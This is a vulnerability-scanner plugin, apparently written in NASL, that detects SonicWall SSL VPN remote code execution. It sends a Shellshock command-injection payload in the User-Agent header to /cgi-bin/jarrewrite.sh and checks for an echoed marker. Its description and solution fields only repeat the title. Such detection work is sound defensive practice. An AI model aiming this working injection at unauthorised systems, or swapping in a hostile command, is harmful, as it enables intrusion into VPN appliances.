include("compat.inc");


if (description)
{
  script_id(51799305);
  script_version("1.3");
  script_name(english:"SonicWall SSL VPN RCE");
  script_summary(english:"SonicWall SSL VPN RCE");
  script_set_attribute(attribute:"description", value:"SonicWall SSL VPN RCE.");
  script_set_attribute(attribute:"solution", value:"SonicWall SSL VPN RCE");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"risk_factor", value:"High");
  script_set_attribute(attribute:"in_the_news", value:"true");
  script_end_attributes();
  script_family(english:"Web Servers");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_category(ACT_ATTACK);
  script_copyright(english:"This script is Copyright (C) WebRAY, Inc.");
  script_require_ports("Services/www",443);
  exit(0);
}



include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("openvas-https2.inc");

ports = get_kb_list("Services/www");
foreach port (ports){
	soc = open_sock_tcp(port);
	if (!soc)
	{
	  audit(AUDIT_SOCK_FAIL, port, appname);
	}
	if (get_kb_list("SSL/Transport/"+port)){
		res = http_get(item:"/cgi-bin/welcome", port:port);
		ssl_res = https_req_get(request:res, port:port);
		if("SonicWALL SSL-VPN" >< ssl_res && "200 OK" >< ssl_res){
			req = http_get(item:"/cgi-bin/jarrewrite.sh", port:port);
			req = ereg_replace(string:req, pattern:"User-Agent: .*", replace: "User-Agent: () { :; }; echo ; /bin/bash -c 'echo Sonic\WALL_SS\L_VP\N_We\b_Ser\ver_R\CE'");
			ssl_reqs = https_req_get(request:req, port:port);
			if("SonicWALL_SSL_VPN_Web_Server_RCE" >< ssl_reqs){
				security_hole(port:port, data:ssl_reqs);
			}	
		}
		
	}else{
		res = http_send_recv3(method: "GET", port: port, item: "/cgi-bin/welcome");
		if("200 OK" >< res[0] && "SonicWALL SSL-VPN" >< res[2] ){
			req = http_send_recv3(method: "GET", port: port, item: "/cgi-bin/jarrewrite.sh", add_headers: make_array("User_Agent", "() { :; }; echo ; /bin/bash -c 'echo Sonic\WALL_SS\L_VP\N_We\b_Ser\ver_R\CE'"));
			if("200 OK" >< req[0] && "SonicWALL_SSL_VPN_Web_Server_RCE" >< req[2] ){
				security_hole(port:port, extra:req[2]);
			}
		}
	}
	close(soc);
}